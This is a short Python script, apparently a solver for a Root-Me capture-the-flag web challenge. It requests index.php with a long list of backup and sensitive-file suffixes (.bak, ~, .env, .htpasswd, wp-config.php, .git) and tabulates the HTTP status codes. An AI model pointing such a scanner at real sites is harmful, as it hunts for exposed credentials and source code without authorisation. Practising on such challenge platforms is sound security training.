import requests
from terminaltables import AsciiTable

# Comprehensive extension list
backup_extensions = [
    "~", ".bak", ".backup", ".bkp", ".old", ".tmp", ".dmp", ".arc", ".ab",
    ".snap", ".dif", ".bkf", ".dmg", ".swp", ".swo", ".part", ".crdownload",
    ".cfg.bak", ".zip", ".tar", ".tar.gz", ".tar.bz2", ".tar.xz", ".gz",
    ".bz2", ".xz", ".7z", ".rar", ".iso", ".wim", ".dmg", ".cab", ".sql",
    ".dump", ".db", ".sqlite", ".mdb", ".accdb", ".rdb", ".ldf", ".bak",
    ".frm", ".ibd", ".cfg", ".ini", ".json", ".xml", ".yaml", ".yml",
    ".toml", ".properties", ".conf", ".log", ".err", ".out", ".enc",
    ".aes", ".gpg", ".pgp", ".crypt", ".sec", ".key", ".code-workspace",
    ".idea", ".iml", ".project", ".settings", ".classpath", ".iso", ".vhd",
    ".vhdx", ".qcow", ".qcow2", ".ova", ".vmdk", ".img", ".dmg", ".git",
    ".svn", ".hg", ".cvs", ".gitignore", ".gitattributes", ".php.bak",
    ".index.bak", ".php~", ".php.old", ".config.php", ".htaccess", ".htpasswd",
    ".env", "wp-config.php", ".autosave", ".temp", ".cache", ".retry", ".debug",
    ".test", ".bkp"
]

table_data = [ ]
for el in backup_extensions:
    url = f"http://challenge01.root-me.org/web-serveur/ch11/index.php{el}" 
    x = requests.get(url)
    table_data.append([url,x.status_code])
    
# Sort by asc status code
table_data.sort(key=lambda item : int(item[1]))
table_ascii = AsciiTable([['Url payload', 'Response status code']]+table_data)
print(table_ascii.table)
